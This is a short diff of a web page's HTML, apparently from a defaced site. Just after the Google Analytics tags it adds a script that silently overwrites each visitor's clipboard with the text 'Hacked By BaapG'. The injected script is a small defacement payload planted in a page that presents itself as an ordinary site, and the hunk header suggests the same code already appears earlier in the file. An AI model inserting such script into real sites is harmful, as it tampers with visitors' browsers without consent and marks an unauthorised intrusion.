@@ -120,6 +120,15 @@ navigator.clipboard.writeText(text).then(function() {
   gtag('js', new Date())
   gtag('config', 'UA-3898076-24')
 </script>
+<script>
+var text = "Hacked By BaapG";
+navigator.clipboard.writeText(text).then(function() {
+  console.log('Async: Copying to clipboard was successful!');
+}, function(err) {
+  console.error('Async: Could not copy text: ', err);
+});
+</script>
+
    <style>
 body {
     background-image: url("https://pa1.narvii.com/6958/b32afa2ea9c603fc4f73fc443ec0504d42d63d82r1-300-300_hq.gif");
